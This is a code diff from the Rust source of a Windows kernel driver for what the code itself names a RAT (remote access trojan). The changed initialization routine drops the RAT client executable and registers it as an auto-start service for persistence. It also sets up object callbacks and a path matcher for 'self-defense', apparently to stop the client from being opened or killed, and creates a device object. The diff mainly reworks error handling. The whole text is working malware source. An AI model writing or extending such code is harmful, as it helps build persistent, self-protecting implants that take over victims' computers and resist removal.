@@ -10,9 +10,7 @@ use rat_common::windows::RAT_CLIENT_SERVICE_NAME;
 use rat_common::windows::kernel::KernelHandoff;
 use wdk::nt_success;
 use wdk_sys::_MODE::KernelMode;
-use wdk_sys::ntddk::{
-    KeDelayExecutionThread, ObUnRegisterCallbacks, RtlInitUnicodeString, ZwClose, ZwCreateKey,
-};
+use wdk_sys::ntddk::{KeDelayExecutionThread, RtlInitUnicodeString, ZwClose, ZwCreateKey};
 use wdk_sys::{
     HANDLE, KEY_ALL_ACCESS, LARGE_INTEGER, OBJ_CASE_INSENSITIVE, OBJ_KERNEL_HANDLE,
     OBJECT_ATTRIBUTES, REG_EXPAND_SZ, REG_OPTION_NON_VOLATILE, REG_SZ, SERVICE_AUTO_START,
@@ -23,12 +21,12 @@ use widestring::{U16CStr, u16cstr};
 use crate::global::{
     MAX_INITIALIZE_ATTEMPTS, OB_REGISTER_CALLBACKS_HANDLE, OBJ_PATH_AHO_CORASICK,
     ORIGINAL_DRIVER_OBJECT, RAT_CLIENT, RAT_CLIENT_OBJ_PATH, RAT_CLIENT_OBJ_PATH_SELF_DEFENSE,
-    RAT_CLIENT_SERVICE_PATH, RAT_CLIENT_SERVICE_REGISTRY,
+    RAT_CLIENT_SERVICE_PATH, RAT_CLIENT_SERVICE_REGISTRY, RAT_DEVICE_OBJECT,
 };
 use crate::handlers::{device, object};
 use crate::wrappers::bindings::InitializeObjectAttributes;
 use crate::wrappers::{fs, registry};
-use crate::{error, info};
+use crate::{cleanup, error, info};
 
 pub unsafe extern "C" fn initialize_thread_routine(extra: *mut c_void) {
     let extra = unsafe { Box::from_raw(extra.cast()) };
@@ -137,67 +135,40 @@ fn u16cstr_to_buf(u16cstr: &U16CStr) -> &[u8] {
 }
 
 fn initialize(extra: &KernelHandoff) -> anyhow::Result<()> {
-    let mut success = true;
-    match drop_file() {
-        Ok(_) => match setup_service_registry(RAT_CLIENT_SERVICE_PATH) {
-            Ok(_) => info!("Service registry setup successfully"),
-            Err(e) => {
-                success = false;
-                error!("Failed to setup service registry: {e}");
-            }
-        },
-        Err(e) => {
-            error!("Failed to drop RAT client: {e}");
-            success = false;
-        }
-    }
+    // Drop client executable
+    drop_file().inspect_err(|e| {
+        error!("Failed to drop RAT client: {e}");
+    })?;
 
-    match AhoCorasickBuilder::new()
+    // Create service registry key
+    setup_service_registry(RAT_CLIENT_SERVICE_PATH).inspect_err(|e| {
+        error!("Failed to setup service registry: {e}");
+    })?;
+
+    // Create Aho-Corasick automaton for self-defense
+    let ac = AhoCorasickBuilder::new()
         .ascii_case_insensitive(true)
         .build([u16cstr_to_buf(RAT_CLIENT_OBJ_PATH_SELF_DEFENSE)])
-    {
-        Ok(ac) => {
-            info!("Constructed Aho-Corasick automaton for object path");
-            let ac = OBJ_PATH_AHO_CORASICK.swap(Box::into_raw(Box::new(ac)), Ordering::AcqRel);
-            if !ac.is_null() {
-                unsafe {
-                    let _ = Box::from_raw(ac);
-                }
-            }
-        }
-        Err(e) => {
-            success = false;
+        .map_err(|e| {
             error!("Failed to build Aho-Corasick automaton for object path: {e}");
-        }
-    }
+            anyhow::anyhow!("Aho-Corasick build error: {e}")
+        })?;
+    cleanup::cleanup_aho_corasick(
+        OBJ_PATH_AHO_CORASICK.swap(Box::into_raw(Box::new(ac)), Ordering::AcqRel),
+    );
 
-    match object::ob_register_callbacks(extra) {
-        Ok(handle) => {
-            info!("Registered object callbacks");
+    // Register object callbacks for self-defense
+    let ob = object::ob_register_callbacks(extra).inspect_err(|e| {
+        error!("Failed to register object callbacks: {e}");
+    })?;
+    cleanup::cleanup_object_callbacks(OB_REGISTER_CALLBACKS_HANDLE.swap(ob, Ordering::AcqRel));
 
-            let handle = OB_REGISTER_CALLBACKS_HANDLE.swap(handle, Ordering::AcqRel);
-            if !handle.is_null() {
-                unsafe {
-                    ObUnRegisterCallbacks(handle);
-                }
-            }
-        }
-        Err(e) => {
-            success = false;
-            error!("Failed to register object callbacks: {e}");
-        }
-    }
-
+    // Create device object
     let driver = ORIGINAL_DRIVER_OBJECT.load(Ordering::Acquire);
+    let device = device::create_device(driver).inspect_err(|e| {
+        error!("Failed to create device object: {e}");
+    })?;
+    cleanup::cleanup_device(RAT_DEVICE_OBJECT.swap(device, Ordering::AcqRel));
 
-    match device::create_device(driver) {
-        Ok(_) => info!("Created device"),
-        Err(e) => {
-            success = false;
-            error!("Failed to create device: {e}");
-        }
-    }
-
-    anyhow::ensure!(success, "At least 1 initialization routine failed");
     Ok(())
 }
